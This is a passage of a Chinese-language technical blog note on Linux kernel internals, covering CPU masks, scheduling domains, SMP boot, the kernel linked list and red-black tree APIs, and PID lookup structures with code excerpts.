cpu_possible_mask ((const struct cpumask *)&amp;__cpu_possible_mask)</span></span><br><span class="line"><span class="comment">// 系统上有多少个正在运行的cpu核心</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> cpu_online_mask   ((const struct cpumask *)&amp;__cpu_online_mask)</span></span><br><span class="line"><span class="comment">// 系统上有多少个具备online条件的cpu核心，有的cpu可能被热拔插</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> cpu_present_mask  ((const struct cpumask *)&amp;__cpu_present_mask)</span></span><br><span class="line"><span class="comment">// 系统上有多少个活跃的cpu核心</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> cpu_active_mask   ((const struct cpumask *)&amp;__cpu_active_mask)</span></span><br></pre></td></tr></table></figure></div>

<p>在Linux内核中，为了实现对多核处理器的调度和管理，将<strong>同一个级别的CPU核心归纳为一个调度组（scheduling group），然后将同一个级别的调度组组合成一个调度域（scheduling domain）</strong>。</p>
<p><strong>调度组</strong>是一组具有相似特性的CPU核心。比如，它们可能位于同一个物理芯片上、共享同一个高速缓存等。通过将这些核心组织在一起，内核可以更有效地进行资源分配和任务调度。调度组通常由内核自动创建，并根据硬件拓扑关系进行组织。</p>
<p><strong>调度域</strong>是一组调度组的集合，它们具有相同的调度策略和目标。调度域用于确定任务在系统中的调度范围和选择可用的CPU核心。通过将调度组组合在一起，内核可以更好地控制任务的调度和负载均衡。</p>
<p><strong>调度域</strong>的几个常见级别包括：</p>
<ol>
<li>CPU级别调度域：表示同一个物理芯片上的多个调度组。这个级别的调度域被称为cpu_domain。</li>
<li>NUMA级别调度域：表示非一致性内存访问（NUMA）架构中的不同内存节点。这个级别的调度域被称为node_domain。</li>
<li>系统级别调度域：表示整个系统中的所有调度组，也可以包括多个NUMA节点。这个级别的调度域被称为sched_domain。</li>
</ol>
<h2 id="调度域和调度组"><a href="#调度域和调度组" class="headerlink" title="调度域和调度组"></a>调度域和调度组</h2><p>调度域（scheduling domain）和调度组（scheduling group）是Linux内核中用于管理多核处理器调度的重要概念。</p>
<ol>
<li><strong>调度组：</strong>Linux内核将同一个级别的CPU核心归纳为一个调度组。调度组是一组具有相似特性的CPU核心，它们通常位于同一个物理芯片上，或者共享同一个高速缓存。通过将这些核心组织在一起，内核可以更好地进行资源分配和任务调度。每个调度组都有自己的调度队列，内核根据调度策略从不同的调度组中选择适当的CPU核心来运行任务。</li>
<li><strong>调度域：</strong>调度域是一组调度组的集合，它们具有相同的调度策略和目标。调度域用于确定任务在系统中的调度范围和选择可用的CPU核心。调度域的层次结构从低到高包括：硬件线程调度域、核调度域、处理器调度域和NUMA节点调度域。每个调度域都负责管理和调度其下一级调度域中的任务。通过将调度组组合在一起形成调度域，内核可以更好地控制任务的调度和负载均衡。</li>
</ol>
<p>通常来说，在多核处理器中，处理器拓扑结构是由多个层次结构组成的。在最底层是核心层，一个处理器可以包含多个核心，每个核心有独立的一级缓存，所有核心共享二级缓存。在核心层之上是硬件线程层，也称为虚拟处理器或逻辑处理器，一个核心可以包含多个硬件线程，这些线程共享一级缓存和二级缓存。在硬件线程层之上是处理器层，一个处理器由多个核心和硬件线程组成，处理器共享内存和I&#x2F;O资源。最高层是NUMA层，它由多个处理器组成，每个处理器可以包含多个处理器层，每个处理器层可以包含多个核心和硬件线程。</p>
<h2 id="处理器拓扑"><a href="#处理器拓扑" class="headerlink" title="处理器拓扑"></a>处理器拓扑</h2><p>处理器拓扑结构是指处理器内部各个组件之间的连接关系和层次结构。在多核处理器中，常见的两种拓扑结构是NUMA（Non-Uniform Memory Access）和SMP（Symmetric Multiprocessing）。</p>
<ol>
<li>NUMA结构：在NUMA结构中，处理器由多个物理节点组成，每个节点包含一部分处理器核心、内存和I&#x2F;O设备。不同节点之间的访问延迟和带宽不同，因此是“非均匀内存访问”结构。在NUMA结构下，任务调度算法需要考虑到任务在不同节点之间的迁移和负载均衡，以优化系统性能。</li>
<li>SMP结构：在SMP结构中，所有处理器核心都共享同一个物理地址空间，内存访问延迟和带宽相同，因此是“对称多处理”结构。在SMP结构下，任务调度算法可以采用简单的轮转或抢占式算法来实现任务的负载均衡。</li>
</ol>
<p>通常来说，在多核处理器中，处理器拓扑结构是由多个层次结构组成的。在最底层是核心层，一个处理器可以包含多个核心，每个核心有独立的一级缓存，所有核心共享二级缓存。在核心层之上是硬件线程层，也称为虚拟处理器或逻辑处理器，一个核心可以包含多个硬件线程，这些线程共享一级缓存和二级缓存。在硬件线程层之上是处理器层，一个处理器由多个核心和硬件线程组成，处理器共享内存和I&#x2F;O资源。最高层是NUMA层，它由多个处理器组成，每个处理器可以包含多个处理器层，每个处理器层可以包含多个核心和硬件线程。</p>
<p><strong>SMP系统启动流程：</strong></p>
<ol>
<li>引导处理器（BP）先完成自身的初始化，然后从start_kernel()调用smp_init()进行SMP结构初始化。</li>
<li>smp_init()的主体是 smp_prepare_cpus()，它会为每个处理器核心分配并初始化一个cpu结构体，并设置相应的标志位。</li>
<li>BP使用smp_callin_map[]表格记录每个处理器核心的状态，并向每个AP发送一个初始化IPI（Inter-Processor Interrupt），通知AP进入start_secondary()函数进行进一步初始化。</li>
<li>AP接收到IPI后，会执行trampoline.S中的一段跳板程序，在跳板程序中会将AP的状态设置为SMP_CALLIN，并调用startup_32()函数完成一些基本的初始化工作。</li>
<li>在start_secondary()函数中，AP会进行进一步的初始化，并等待全局变量smp_commenced变为1。这个变量是在BP完成所有AP的启动后被设置为1的。</li>
<li>BP调用smp_cpus_done()函数等待所有AP完成初始化，并最终调用smp_commence()函数发出起跑命令。</li>
<li>每个CPU进入cpu_idle()函数，等待调度。在这个函数中，处理器核心会处于空闲状态，并等待操作系统调度器分配任务给它。一旦有任务需要执行，处理器核心就会被唤醒并开始执行任务。</li>
</ol>
<h1 id="内核数据结构"><a href="#内核数据结构" class="headerlink" title="内核数据结构"></a>内核数据结构</h1><p><a class="link"   href="https://zhuanlan.zhihu.com/p/58087261" >参考链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Linux内核链表实现"><a href="#Linux内核链表实现" class="headerlink" title="Linux内核链表实现"></a>Linux内核链表实现</h2><p>单向链表和双向链表在实际使用中有一些局限性，如数据区必须是固定数据，而实际需求是多种多样的。这种方法无法构建一套通用的链表，因为每个不同的数据区需要一套链表。为此，Linux内核把所有链表操作方法的共同部分提取出来，把不同的部分留给代码编程者自己去处理。Linux内核实现了一套纯链表的封装，链表节点数据结构只有指针区而没有数据区，另外还封装了各种操作函数，如创建节点函数、插入节点函数、删除节点函数、遍历节点函数等。</p>
<p>Linux内核链表使用struct list_head数据结构来描述。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&lt;include/linux/types.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>struct list_head数据结构不包含链表节点的数据区，通常是嵌入其他数据结构，如struct page数据结构中嵌入了一个lru链表节点，通常是把page数据结构挂入LRU链表。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&lt;include/linux/mm_types.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>链表头的初始化有两种方法，一种是静态初始化，另一种动态初始化。把next和prev指针都初始化并指向自己，这样便初始化了一个带头节点的空链表。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&lt;include/linux/<span class="built_in">list</span>.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*静态初始化*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIST_HEAD_INIT(name) &#123; &amp;(name), &amp;(name) &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LIST_HEAD(name) \</span></span><br><span class="line"><span class="meta">    struct list_head name = LIST_HEAD_INIT(name)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*动态初始化*/</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">INIT_LIST_HEAD</span><span class="params">(<span class="keyword">struct</span> list_head *<span class="built_in">list</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">list</span>-&gt;next = <span class="built_in">list</span>;</span><br><span class="line">    <span class="built_in">list</span>-&gt;prev = <span class="built_in">list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>添加节点到一个链表中，内核提供了几个接口函数，如list_add()是把一个节点添加到表头，list_add_tail()是插入表尾。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&lt;include/linux/<span class="built_in">list</span>.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">list_add</span><span class="params">(<span class="keyword">struct</span> list_head *new, <span class="keyword">struct</span> list_head *head)</span></span><br><span class="line"><span class="title function_">list_add_tail</span><span class="params">(<span class="keyword">struct</span> list_head *new, <span class="keyword">struct</span> list_head *head)</span></span><br></pre></td></tr></table></figure></div>

<p>遍历节点的接口函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> list_for_each(pos, head) \</span></span><br><span class="line"><span class="meta">for (pos = (head)-&gt;next; pos != (head); pos = pos-&gt;next)</span></span><br></pre></td></tr></table></figure></div>

<p>这个宏只是遍历一个一个节点的当前位置，那么如何获取节点本身的数据结构呢？这里还需要使用list_entry()宏。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> list_entry(ptr, type, member) \</span></span><br><span class="line"><span class="meta">    container_of(ptr, type, member)</span></span><br><span class="line">container_of()宏的定义在kernel.h头文件中。</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> container_of(ptr, type, member) (&#123;            \</span></span><br><span class="line"><span class="meta">    const typeof( ((type *)0)-&gt;member ) *__mptr = (ptr);    \</span></span><br><span class="line"><span class="meta">    (type *)( (char *)__mptr - offsetof(type,member) );&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offsetof(TYPE, MEMBER) ((size_t) &amp;((TYPE *)0)-&gt;MEMBER)</span></span><br></pre></td></tr></table></figure></div>

<p>其中offsetof()宏是通过把0地址转换为type类型的指针，然后去获取该结构体中member成员的指针，也就是获取了member在type结构体中的偏移量。最后用指针ptr减去offset，就得到type结构体的真实地址了。</p>
<p>下面是遍历链表的一个例子。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">&lt;drivers/block/osdblk.c&gt;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">class_osdblk_list</span><span class="params">(<span class="keyword">struct</span> class *c,</span></span><br><span class="line"><span class="params">                <span class="keyword">struct</span> class_attribute *attr,</span></span><br><span class="line"><span class="params">                <span class="type">char</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each(tmp, &amp;osdblkdev_list) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">osdblk_device</span> *<span class="title">osdev</span>;</span></span><br><span class="line"></span><br><span class="line">        osdev = list_entry(tmp, <span class="keyword">struct</span> osdblk_device, node);</span><br><span class="line"></span><br><span class="line">        n += <span class="built_in">sprintf</span>(data+n, <span class="string">&quot;%d %d %llu %llu %s\n&quot;</span>,</span><br><span class="line">            osdev-&gt;id,</span><br><span class="line">            osdev-&gt;major,</span><br><span class="line">            osdev-&gt;obj.partition,</span><br><span class="line">            osdev-&gt;obj.id,</span><br><span class="line">            osdev-&gt;osd_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a><strong>红黑树</strong></h2><p>红黑树（Red Black Tree）被广泛应用在内核的内存管理和进程调度中，用于将排序的元素组织到树中。红黑树被广泛应用在计算机科学的各个领域中，它在速度和实现复杂度之间提供一个很好的平衡。</p>
<p>红黑树是具有以下特征的二叉树。</p>
<p>　每个节点或红或黑。</p>
<ul>
<li>每个叶节点是黑色的。</li>
<li>如果结点都是红色，那么两个子结点都是黑色。</li>
<li>从一个内部结点到叶结点的简单路径上，对所有叶节点来说，黑色结点的数目都是相同的。</li>
</ul>
<p>红黑树的一个优点是，所有重要的操作（例如插入、删除、搜索）都可以在<em>O</em>(log <em>n</em>)时间内完成，<em>n</em>为树中元素的数目。经典的算法教科书都会讲解红黑树的实现，这里只是列出一个内核中使用红黑树的例子，供读者在实际的驱动和内核编程中参考。这个例子可以在内核代码的documentation&#x2F;Rbtree.txt文件中找到。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/mm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/rbtree.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;figo.zhang&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot; &quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mytype</span> &#123;</span> </span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">node</span>;</span></span><br><span class="line">     <span class="type">int</span> key; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*红黑树根节点*/</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">mytree</span> =</span> RB_ROOT;</span><br><span class="line"><span class="comment">/*根据key来查找节点*/</span></span><br><span class="line"><span class="keyword">struct</span> mytype *<span class="title function_">my_search</span><span class="params">(<span class="keyword">struct</span> rb_root *root, <span class="type">int</span> new)</span></span><br><span class="line">  &#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">node</span> =</span> root-&gt;rb_node;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> (node) &#123;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">mytype</span> *<span class="title">data</span> =</span> container_of(node, <span class="keyword">struct</span> mytype, node);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (data-&gt;key &gt; new)</span><br><span class="line">               node = node-&gt;rb_left;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (data-&gt;key &lt; new)</span><br><span class="line">               node = node-&gt;rb_right;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">               <span class="keyword">return</span> data;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*插入一个元素到红黑树中*/</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">my_insert</span><span class="params">(<span class="keyword">struct</span> rb_root *root, <span class="keyword">struct</span> mytype *data)</span></span><br><span class="line">  &#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> **<span class="title">new</span> =</span> &amp;(root-&gt;rb_node), *parent=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* 寻找可以添加新节点的地方 */</span></span><br><span class="line">     <span class="keyword">while</span> (*new) &#123;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">mytype</span> *<span class="title">this</span> =</span> container_of(*new, <span class="keyword">struct</span> mytype, node);</span><br><span class="line"></span><br><span class="line">          parent = *new;</span><br><span class="line">          <span class="keyword">if</span> (this-&gt;key &gt; data-&gt;key)</span><br><span class="line">               new = &amp;((*new)-&gt;rb_left);</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (this-&gt;key &lt; data-&gt;key) &#123;</span><br><span class="line">               new = &amp;((*new)-&gt;rb_right);</span><br><span class="line">          &#125; <span class="keyword">else</span></span><br><span class="line">               <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* 添加一个新节点 */</span></span><br><span class="line">     rb_link_node(&amp;data-&gt;node, parent, new);</span><br><span class="line">     rb_insert_color(&amp;data-&gt;node, root);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">my_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">int</span> i;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">mytype</span> *<span class="title">data</span>;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">node</span>;</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">/*插入元素*/</span></span><br><span class="line">     <span class="keyword">for</span> (i =<span class="number">0</span>; i &lt; <span class="number">20</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line">          data = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> mytype), GFP_KERNEL);</span><br><span class="line">          data-&gt;key = i;</span><br><span class="line">          my_insert(&amp;mytree, data);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*遍历红黑树，打印所有节点的key值*/</span></span><br><span class="line">      <span class="keyword">for</span> (node = rb_first(&amp;mytree); node; node = rb_next(node)) </span><br><span class="line">          printk(<span class="string">&quot;key=%d\n&quot;</span>, rb_entry(node, <span class="keyword">struct</span> mytype, node)-&gt;key);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">my_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">mytype</span> *<span class="title">data</span>;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">node</span>;</span></span><br><span class="line">     <span class="keyword">for</span> (node = rb_first(&amp;mytree); node; node = rb_next(node)) &#123;</span><br><span class="line">          data = rb_entry(node, <span class="keyword">struct</span> mytype, node);</span><br><span class="line">          <span class="keyword">if</span> (data) &#123;</span><br><span class="line">                rb_erase(&amp;data-&gt;node, &amp;mytree);</span><br><span class="line">                kfree(data);</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">module_init(my_init);</span><br><span class="line">module_exit(my_exit);</span><br></pre></td></tr></table></figure></div>

<p>mytree 是红黑树的根节点，my_insert() 实现插入一个元素到红黑树中，my_search() 根据key来查找节点。内核大量使用红黑树，如虚拟地址空间 VMA 的管理。</p>
<h1 id="进程管理常用API"><a href="#进程管理常用API" class="headerlink" title="进程管理常用API"></a>进程管理常用API</h1><p><a class="link"   href="https://blog.csdn.net/h549570564/article/details/106819598" >参考链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="struct-pid"><a href="#struct-pid" class="headerlink" title="struct pid"></a>struct pid</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span>                       <span class="comment">//指向pid_namespace的引用个数</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pidmap</span> <span class="title">pidmap</span>[<span class="title">PIDMAP_ENTRIES</span>];</span>   <span class="comment">//分配pid的位图</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">	<span class="type">int</span> last_pid;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> nr_hashed;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">child_reaper</span>;</span>   <span class="comment">/* 托管进程，如果父进程先于子进程退出，托管进程会对孤儿进程调用wait4</span></span><br><span class="line"><span class="comment">                                         * 每个命名空间都具有的进程，发挥的作用相当于全局的init进程</span></span><br><span class="line"><span class="comment">                                         */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">pid_cachep</span>;</span>      <span class="comment">//分配pid的slab地址</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> level;                 <span class="comment">//当前命名空间的级别，父进程 level = n，则子进程 level = n+1</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> *<span class="title">parent</span>;</span>       <span class="comment">//父命名空间</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PROC_FS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">proc_mnt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">proc_self</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">proc_thread_self</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_BSD_PROCESS_ACCT</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_pin</span> *<span class="title">bacct</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">proc_work</span>;</span></span><br><span class="line">	<span class="type">kgid_t</span> pid_gid;</span><br><span class="line">	<span class="type">int</span> hide_pid;</span><br><span class="line">	<span class="type">int</span> reboot;	<span class="comment">/* group exit code if this pidns was rebooted */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ns_common</span> <span class="title">ns</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pid_type</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PIDTYPE_PID,</span><br><span class="line">    PIDTYPE_PGID,</span><br><span class="line">    PIDTYPE_SID,</span><br><span class="line">    PIDTYPE_MAX</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">atomic_t</span> count;                 <span class="comment">// 该pid被不同task_struct引用的次数(不同的命名空间，可以存在相同的pid)</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> level;             <span class="comment">// 这个pid结构体的深度, root level = 0, root的子空间为1</span></span><br><span class="line">	<span class="comment">/* lists of tasks that use this pid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">tasks</span>[<span class="title">PIDTYPE_MAX</span>];</span>   <span class="comment">// 指向与该pid相连的task</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">upid</span> <span class="title">numbers</span>[1];</span>         <span class="comment">/* 变长数组, 存储upid结构, 数组大小为 level+1</span></span><br><span class="line"><span class="comment">                                     * numbers[0], numbers[1],..., numbers[level]</span></span><br><span class="line"><span class="comment">                                     * 由于同一个pid从下往上会被映射到多个 namespace 中</span></span><br><span class="line"><span class="comment">                                     * 这里会保存每一个 namespace 下的 upid 信息</span></span><br><span class="line"><span class="comment">                                     */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * struct upid is used to get the id of the struct pid, as it is</span></span><br><span class="line"><span class="comment"> * seen in particular namespace. Later the struct pid is found with</span></span><br><span class="line"><span class="comment"> * find_pid_ns() using the int nr and struct pid_namespace *ns.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">upid</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Try to keep pid_chain in the same cacheline as nr for find_vpid */</span></span><br><span class="line">	<span class="type">int</span> nr;                         <span class="comment">// PID具体的值</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid_namespace</span> *<span class="title">ns</span>;</span>       <span class="comment">// 指向命名空间的指针</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">pid_chain</span>;</span>    <span class="comment">/* pid哈希列表(pid_hash)中的节点，用于快速通过nr和ns查找到upid</span></span><br><span class="line"><span class="comment">	                                 * 在alloc_pid 时将该节点添加到哈希列表中</span></span><br><span class="line"><span class="comment">	                                 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="find-get-pid"><a href="#find-get-pid" class="headerlink" title="find_get_pid()"></a>find_get_pid()</h2><p>根据进程编号，获取进程描述符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> pid *<span class="title function_">find_get_pid</span><span class="params">(<span class="type">pid_t</span> nr)</span> <span class="comment">// nr 进程编号</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pid</span>;</span></span><br><span class="line"></span><br><span class="line">	rcu_read_lock(); <span class="comment">// RCU读加锁</span></span><br><span class="line">	pid = get_pid(find_vpid(nr)); <span class="comment">// 调用 get_pid() 增加引用计数</span></span><br><span class="line">	rcu_read_unlock();<span class="comment">// RCU读解锁</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(find_get_pid);</span><br></pre></td></tr></table></figure></div>

<h3 id="find-vpid"><a href="#find-vpid" class="headerlink" title="find_vpid()"></a>find_vpid()</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> pid *<span class="title function_">find_vpid</span><span class="params">(<span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> find_pid_ns(nr, task_active_pid_ns(current));</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(find_vpid);</span><br></pre></td></tr></table></figure></div>

<h3 id="get-pid"><a href="#get-pid" class="headerlink" title="get_pid()"></a>get_pid()</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> pid *<span class="title function_">get_pid</span><span class="params">(<span class="keyword">struct</span> pid *pid)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (pid)</span><br><span class="line">		refcount_inc(&amp;pid-&gt;count);</span><br><span class="line">	<span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="pid-task"><a href="#pid-task" class="headerlink" title="pid_task()"></a>pid_task()</h2><p>获取任务描述符相关信息。</p>
